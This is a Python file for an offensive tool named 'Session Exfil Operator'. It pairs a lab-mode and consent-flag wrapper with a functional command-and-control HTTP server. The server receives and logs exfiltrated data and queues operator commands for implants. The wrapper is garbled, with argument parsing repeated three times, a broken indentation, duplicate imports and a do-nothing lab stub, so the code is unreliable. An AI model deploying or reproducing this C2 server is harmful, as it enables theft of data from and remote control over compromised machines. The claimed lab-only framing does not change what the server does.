import os
from datetime import datetime

from datetime import datetime

LOG_PATH = os.path.expanduser("~/exfil/.logs/exfil.log")

def log_event(event):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_PATH, "a") as log:
        log.write(f"[{timestamp}] {event}\n")

"""
__toolname__ = "Session Exfil Operator"
__author__ = "BlackOpsArchitect"
__intended_use__ = "Red team simulation / adversarial lab training only"
__lab_safe__ = True
__version__ = "1.0.10"
__kill_switch__ = "ENV:KILL=1"
__consent_required__ = True
__notes__ = "Stealth-grade tool with modular execution, full encryption, and lab-mode gating"
"""



import argparse
parser = argparse.ArgumentParser()
    parser.add_argument("--field", action="store_true", help="Field mode (exfil+persistence)")
parser.add_argument("--lab", action="store_true")


parser.add_argument("--consent", action="store_true")

parser.add_argument("--kill", action="store_true")
parser.add_argument("--lab", action="store_true", help="Lab mode (safe testing)")
parser.add_argument("--consent", action="store_true", help="Acknowledge and proceed")
parser.add_argument("--kill", action="store_true", help="Trigger kill switch")
args = parser.parse_args()
import argparse

parser = argparse.ArgumentParser(description="Session Exfil Operator Suite")
parser.add_argument("--lab", action="store_true", help="Run in lab-safe mode (no persistence, no outbound exfil)")
parser.add_argument("--consent", action="store_true", help="Acknowledge ethical usage terms")
parser.add_argument("--kill", action="store_true", help="Trigger immediate kill-switch")

args = parser.parse_args()

if not args.consent:
    print("[!] Consent flag required to proceed with execution.")
    exit(0)

if args.kill or os.getenv("KILL") == "1":
    print("[x] Kill switch triggered. Exiting.")
    exit(0)

if args.lab:
    print("[*] Lab mode activated. Exfiltration and persistence modules disabled.")
    # Stub any real payload execution here (example)
    def noop(): pass


#!/usr/bin/env python3
import http.server
import socketserver
import threading
import json

PORT = 8080
HOST = "0.0.0.0"
LOG_FILE = "c2_exfil.log"
COMMAND_QUEUE = []

class C2Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_len = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_len).decode()
        try:
            data = json.loads(body)
            with open(LOG_FILE, "a") as f:
                f.write(json.dumps(data) + "\n")
            print(f"[+] Exfil Received: {data}")
        except Exception as e:
            print(f"[!] Invalid exfil: {e}")
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        if COMMAND_QUEUE:
            command = COMMAND_QUEUE.pop(0)
            self.wfile.write(json.dumps({"cmd": command}).encode())
        else:
            self.wfile.write(json.dumps({"cmd": "noop"}).encode())

def command_input():
    while True:
        cmd = input("C2> ")
        if cmd.strip():
            COMMAND_QUEUE.append(cmd.strip())

def start_server():
    with socketserver.TCPServer((HOST, PORT), C2Handler) as httpd:
        print(f"[✓] C2 Server listening on {HOST}:{PORT}")
        httpd.serve_forever()

if __name__ == "__main__":
    threading.Thread(target=start_server, daemon=True).start()
    command_input()
